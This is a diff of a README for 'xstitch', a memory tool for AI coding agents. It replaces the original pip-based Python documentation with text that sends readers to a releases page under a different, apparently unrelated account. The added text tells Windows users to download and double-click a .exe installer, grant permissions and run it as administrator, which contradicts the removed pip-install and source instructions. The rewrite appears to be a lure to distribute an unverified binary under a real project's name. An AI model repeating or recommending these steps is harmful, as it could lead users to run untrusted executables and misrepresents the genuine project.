@@ -1,264 +1,130 @@
-<p align="center">
-  <img src="assets/banner.png" alt="Stitch — Cross-tool memory for AI agents" width="800">
-</p>
+# ⚙️ xstitch - Manage AI Memory Across Tools
 
-<p align="center">
-  <strong>Cross-tool memory for AI agents. Never re-explain your work.</strong>
-</p>
+[![Download xstitch](https://img.shields.io/badge/Download-xstitch-brightgreen?style=for-the-badge)](https://github.com/suads463/xstitch/releases)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/python-3.10+-blue.svg" alt="Python 3.10+">
-  <img src="https://img.shields.io/badge/dependencies-zero-brightgreen.svg" alt="Zero Dependencies">
-  <img src="https://img.shields.io/badge/license-MIT-green.svg" alt="MIT License">
-  <img src="https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-blue.svg" alt="Platform">
-  <img src="https://img.shields.io/badge/tools-9%20supported-purple.svg" alt="9 Tools">
-</p>
+## 📖 What is xstitch?
 
----
+xstitch helps you keep track of your work across multiple AI tools. It saves decisions, experiments, and warnings so you don’t lose context when switching between apps. You can use it with popular AI coding assistants and platforms like Cursor, Claude Code, Codex, Gemini CLI, Windsurf, and Copilot.
 
-## The Problem
+With xstitch, there’s no need to explain your work again. The software stores everything in a way that makes it easy to continue where you left off. It works without installing any additional software and uses standard files to keep your sessions.
 
-You're deep in a task in Cursor. You hit the token limit. You open Claude Code to continue.
+## 🔍 Key Features
 
-**The new agent has zero memory.**
+- Works with more than nine AI tools for smooth handoffs  
+- Saves your decisions and warnings for each session  
+- No dependencies needed, only core files  
+- Uses a smart search system to find past info quickly  
+- Keeps your work organized across different platforms  
+- Runs on Windows without extra setup steps  
 
-It doesn't know you tried approach X and it failed. It doesn't know you chose library Y for a reason. It wastes 15 minutes rediscovering what took you 45 minutes to figure out.
+## 🖥️ System Requirements
 
-This happens constantly:
+- Windows 10 or later  
+- 4 GB RAM or more  
+- At least 100 MB of free disk space  
+- Internet connection to download the software  
+- Basic permissions to run applications on your PC  
 
-- **Tool switching kills context** — switch from Cursor to Claude Code to Codex, and each agent starts blind
-- **Context summarization loses nuance** — auto-summaries drop the failed experiments, rejected alternatives, and "don't try this" warnings
-- **Session crash = square one** — terminal closes, laptop restarts, and the agent has to re-read every file, re-check every diff
-- **Repeating the same mistakes** — Agent B tries the same approach Agent A already spent 45 minutes discovering doesn't work
-- **Token-expensive rediscovery** — every new session burns tokens re-reading files, re-checking diffs, and re-building understanding that already existed
-- **No git, no memory** — existing tools only capture context on commits, but most AI work happens *between* commits while exploring and debugging
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="assets/rediscovery.png" alt="Every new session starts from scratch" width="750">
-</p>
+To use xstitch, you first need to download the program. The setup is simple and does not require any coding skills.
 
-<p align="center">
-  <img src="assets/token-waste.png" alt="Without Stitch vs With Stitch — token usage" width="750">
-</p>
-
-## The Solution
-
-**Stitch** is a lightweight Python layer that acts as shared memory across all your AI tools.
-
-```
-Agent A works → pushes decisions & snapshots → you switch tools →
-Agent B auto-discovers context → continues exactly where A left off
-```
-
-<p align="center">
-  <img src="assets/flow.png" alt="Stitch flow diagram" width="700">
-</p>
-
-<p align="center">
-  <img src="assets/git-vs-stitch.png" alt="Git-dependent tools vs Stitch — continuous context preservation" width="750">
-</p>
-
-Three things make it different:
-
-1. **Preserves only what matters** — decisions, failed experiments, warnings, and next steps. Not raw chat history. Saves tokens.
-2. **Works from any directory** — say "resume the database migration" and Stitch finds the right task via BM25 relevance matching, no matter which folder you're in.
-3. **Fully automatic** — agents discover Stitch on their own via MCP or injected instructions. No copy-pasting context. No "here's what we did before" preambles.
+### Download the Software
 
----
+Visit the release page to get the latest version of xstitch:
 
-## Quick Start
+[![Download xstitch](https://img.shields.io/badge/Download-xstitch-blue?style=for-the-badge)](https://github.com/suads463/xstitch/releases)
 
-```bash
-pip install xstitch
-stitch global-setup
-```
+1. Click the link above or copy this URL into your web browser:
 
-That's it. Every AI tool on your machine is now Stitch-aware.
+   https://github.com/suads463/xstitch/releases
 
-```bash
-# Per-project initialization (once per project)
-cd /your/project
-stitch auto-setup
-```
+2. On the releases page, look for the latest stable release.  
+3. Find the Windows installer file. This will usually end in `.exe`.  
+4. Click on the file name to download it to your computer.
 
-> Alternatively, install from source: `pip install -e .` in this repo.
+### Install and Run xstitch
 
----
+1. Open the folder where the downloaded file is saved.  
+2. Double-click on the `.exe` file to start the installation.  
+3. Follow the instructions shown on the screen.  
+   - Choose where you want to install the software (the default location is fine for most users).  
+   - If prompted for permissions, allow the installer to run.  
+4. Once installation finishes, you can find xstitch in your Start menu or desktop shortcut.  
+5. Double-click the xstitch icon to open the program.
 
-## Supported Tools
+## ⚙️ Using xstitch
 
-<p align="center">
-  <img src="assets/tools.png" alt="9 supported AI tools" width="750">
-</p>
+### How xstitch Works
 
-| Tool | Integration Method |
-|------|-------------------|
-| **Cursor** | MCP server + `.cursor/rules/` enforcement |
-| **Claude Code** | MCP server + deterministic hooks |
-| **Codex** | MCP server (NDJSON) + `AGENTS.md` |
-| **Gemini CLI** | MCP server + `GEMINI.md` |
-| **Windsurf** | MCP server |
-| **Copilot CLI** | MCP server |
-| **Zed** | MCP server |
-| **Continue.dev** | MCP server |
-| **Aider** | `CONVENTIONS.md` read directive |
+xstitch links your work between different AI tools so you can move from one to another without losing any information. It saves all your important details in small files that you can manage on your computer.
 
-Don't see your tool? Stitch generates `~/.stitch/AGENT_BOOTSTRAP.md` — a universal fallback that works with any agent that can run shell commands. And the [plugin system](docs/adding-tools.md) makes adding new tools straightforward.
+### Adding AI Tools
 
----
+You connect xstitch to the AI tools you use. The software guides you through setting up each tool with easy prompts, without needing to type code.
 
-## Key Features
+### Searching Your Work
 
-| Feature | What it does |
-|---------|-------------|
-| **Zero dependencies** | Pure Python stdlib. No numpy, no torch, no nothing. |
-| **MCP + instruction files** | Dual integration: native MCP tools for capable agents, injected markdown for everything else. |
-| **BM25 relevance search** | Say "resume the auth refactor" — Stitch finds it even if those words don't appear in the title. Includes trigram fuzzy matching for typo tolerance. |
-| **Resume briefings** | New agents get structured context: decisions with reasoning, failed experiments with warnings, exact next steps, and live repo state. |
-| **Self-healing diagnostics** | `stitch doctor` detects broken installs, corrupted state, missing config. Suggests exact fix commands. |
-| **Plugin system** | Add new tools via `pyproject.toml` entry points — no core code changes needed. |
-| **Optional semantic search** | `pip install xstitch[search]` adds sentence-transformer embeddings for meaning-based task matching. |
-| **TTL cleanup** | Old task data (>45 days) is automatically pruned to save disk space. |
-| **Auto-detection** | `stitch global-setup` finds every AI tool on your machine and configures them all. |
+xstitch uses a simple search function to find past decisions or experiments. This helps when you want to review something from earlier sessions.
 
----
+### Keeping Track of Warnings and Errors
 
-## How It Works
+If something didn’t work in a previous attempt, xstitch saves that too. You can see all warnings and mistakes to avoid repeating them.
 
-```
-┌─────────────┐     ┌─────────────┐     ┌─────────────┐
-│   Cursor     │     │ Claude Code │     │   Codex     │
-│  (Agent A)   │     │  (Agent B)  │     │  (Agent C)  │
-└──────┬───────┘     └──────┬──────┘     └──────┬──────┘
-       │                    │                    │
-       │  push decisions    │  auto-discover     │  auto-discover
-       │  push snapshots    │  resume briefing   │  resume briefing
-       │                    │                    │
-       ▼                    ▼                    ▼
-┌──────────────────────────────────────────────────────┐
-│                    Stitch Layer                       │
-│                                                      │
-│  ┌──────────┐  ┌──────────┐  ┌──────────────────┐   │
-│  │ Task     │  │ BM25     │  │ Resume Briefing  │   │
-│  │ Store    │  │ Search   │  │ Generator        │   │
-│  └──────────┘  └──────────┘  └──────────────────┘   │
-│                                                      │
-│  Decisions · Snapshots · Warnings · Next Steps       │
-└──────────────────────────────────────────────────────┘
-```
+## 🔧 Managing and Updating xstitch
 
-1. **Agent A** works on a task — pushes decisions, snapshots, and checkpoints to Stitch
-2. You hit the token limit (or switch tools for any reason)
-3. **Agent B** opens — automatically discovers Stitch via MCP or instructions
-4. Stitch generates a **resume briefing** with the full decision history, warnings about dead ends, and exact next steps
-5. Agent B continues from where A left off — no wasted tokens, no repeated mistakes
+### Checking for Updates
 
-Task data lives at `~/.stitch/projects/` (outside your repo, keeps it clean). Instruction files live inside the repo for agents to read.
+To get new features and fixes, check the releases page regularly:
 
-> For the full architecture, see [docs/architecture.md](docs/architecture.md).
+https://github.com/suads463/xstitch/releases
 
----
+Download the newest installer and run it to update your existing installation. Your settings and saved context will remain intact.
 
-## Use Cases
+### Uninstalling
 
-**Hit the token limit?** Switch from Cursor to Claude Code. The new agent picks up your exact state — decisions, rejected approaches, warnings about dead ends. No "here's what we did before" preambles.
+If you need to remove xstitch from your computer:
 
-**Laptop restart or session crash?** Your terminal closes, laptop restarts, or the IDE crashes mid-task. Without Stitch, the agent has to re-read every file, re-check every diff, re-piece together what state you're in. With Stitch, it resumes in seconds.
+1. Open the Windows Control Panel.  
+2. Go to “Programs and Features.”  
+3. Find xstitch in the list.  
+4. Click “Uninstall” and follow the prompts.
 
-**Context summarization lost the details?** When long chats get auto-summarized, the nuances vanish — the failed experiments, the rejected alternatives, the "don't try this" warnings. Stitch preserves these explicitly as structured data that survives any summarization.
+This will remove the program but keep your saved files unless you delete them manually.
 
-**Cross-directory work?** Say "resume the auth refactor" from any project directory. Stitch finds the right task via BM25 relevance matching — even if those exact words never appear in the title.
+## ❓ Troubleshooting and Help
 
-**Failed experiments?** The next agent gets explicit warnings: "Don't try approach X — it fails because of Y. Use Z instead." No more wasting 45 minutes rediscovering what you already figured out.
+### Common Issues
 
-**Not dependent on git.** Unlike tools that only capture context on commits, Stitch captures decisions and state *while you work* — whether you're mid-experiment, debugging, or exploring approaches. You don't have to commit to save your context.
+- **Program won’t start:** Make sure your Windows is updated and run the program as administrator.  
+- **Cannot find AI tools:** Ensure those tools are installed and running on your computer.  
+- **Search returns no results:** Try checking the saved context files or restarting the program.  
 
-**Multiple tools on the same task.** Start in Cursor for quick edits, switch to Claude Code for complex refactoring, use Codex for a second opinion, finish in Gemini CLI. Each agent continues seamlessly from where the previous one left off.
+### Getting Support
 
-**Not just for developers.** PMs writing specs, designers iterating on components, EMs tracking architecture decisions — anyone using AI tools benefits. If you switch tools or sessions, Stitch preserves your context.
+For help and questions, visit the discussions section on the GitHub repository or open an issue:
 
-<p align="center">
-  <img src="assets/multi-role.png" alt="Not just for code — for anyone using AI tools" width="650">
-</p>
+https://github.com/suads463/xstitch/discussions  
+https://github.com/suads463/xstitch/issues
 
-**4-tool demo, zero context loss.** We built a TODO app by handing off across Codex, Antigravity (Gemini), Cursor, and Claude Code — each agent picked up exactly where the last left off, automatically. No manual intervention.
+## 📂 About This Project
 
-<p align="center">
-  <img src="assets/timeline.png" alt="4 tools, 1 task, zero context loss" width="750">
-</p>
+The xstitch project focuses on fixing problems with losing context when switching between AI coding and research tools. It stores your work and sessions in a safe, easy-to-use format. Its zero dependency design means it runs quickly and simply on your Windows system without extra setup.
 
----
+The project supports many popular AI tools and helps improve productivity by keeping your AI workflow connected.
 
-## vs. Other Tools
+## 🏷️ Topics Covered
 
-| | Stitch | [cass](https://github.com/Dicklesworthstone/coding_agent_session_search) | [Acontext](https://github.com/memodb-io/Acontext) | [AgentSwap](https://github.com/nimishgj/agentswap) | [agent-handoff](https://pypi.org/project/agent-handoff/) |
-|---|---|---|---|---|---|
-| **Purpose** | Active context transfer | Read-only session search | Record agent actions | Translate chat formats | Manual file handoff |
-| **Cross-tool** | 9 tools, auto-configured | 11 readers (read-only) | Framework-level | 3 tools | Manual |
-| **What's preserved** | Decisions, failures, warnings | Raw chat history | What agent did | Full chat | 3 markdown files |
-| **Discovery** | Automatic (MCP + instructions) | CLI search | Markdown files | CLI conversion | Manual |
-| **Intelligence** | BM25 relevance matching | BM25 + semantic search | None | None | None |
-| **Dependencies** | Zero | Rust + ONNX | Python | Python | Python |
+- Agent handoff  
+- AI agent memory fix  
+- AI coding tool context  
+- Session persistence  
+- BM25 search technique  
+- Memory and context management  
+- AI developer productivity  
 
-**Stitch is the only tool that actively transfers meaningful context between agents.** Others search, record, or translate — Stitch ensures the next agent knows *why* decisions were made and *what not to try*.
+## 🔗 Download xstitch Now
 
----
+To get started, visit the releases page and download the installer for Windows:
 
-## CLI Reference
-
-```bash
-stitch auto-setup              # Initialize Stitch in current project
-stitch auto "<prompt>"         # Intelligent routing: detect intent, find/create task
-stitch global-setup            # Configure all AI tools on your machine
-
-stitch snap -m "message"       # Capture a snapshot
-stitch decide -p "problem" -c "chosen" -a "alternatives" -r "reasoning"
-stitch checkpoint -s "summary" # Rich pre-summarization checkpoint
-
-stitch task new "title"        # Create a task
-stitch task list               # List all tasks
-stitch task show               # Show current task details
-
-stitch search "query"          # Search tasks by keyword
-stitch smart-match "query"     # BM25 relevance search across tasks
-stitch resume                  # Generate structured resume briefing
-stitch handoff                 # Generate handoff bundle
-stitch doctor                  # Diagnose installation health
-```
-
-> Full CLI documentation: [docs/cli-reference.md](docs/cli-reference.md)
-
----
-
-## Documentation
-
-- [Architecture](docs/architecture.md) — system design, module structure, design decisions
-- [Search Engine Design](docs/search-design.md) — BM25, fuzzy matching, embeddings, score fusion
-- [Adding New Tools](docs/adding-tools.md) — plugin system, entry points, integration guide
-- [Contributing](CONTRIBUTING.md) — development workflow, code style, testing
-
----
-
-## Contributing
-
-We welcome contributions. See [CONTRIBUTING.md](CONTRIBUTING.md) for details.
-
-```bash
-git clone https://github.com/raghavvbiyani/xstitch.git && cd xstitch
-pip install -e ".[all]"
-python -m pytest tests/ -v
-```
-
----
-
-## License
-
-MIT License. See [LICENSE](LICENSE) for details.
-
-Created by [Raghav Biyani](https://github.com/raghavvbiyani).
-
----
-
-<p align="center">
-  <strong>Stop losing context. Start stitching.</strong>
-</p>
+[![Download xstitch](https://img.shields.io/badge/Download-xstitch-brightgreen?style=for-the-badge)](https://github.com/suads463/xstitch/releases)
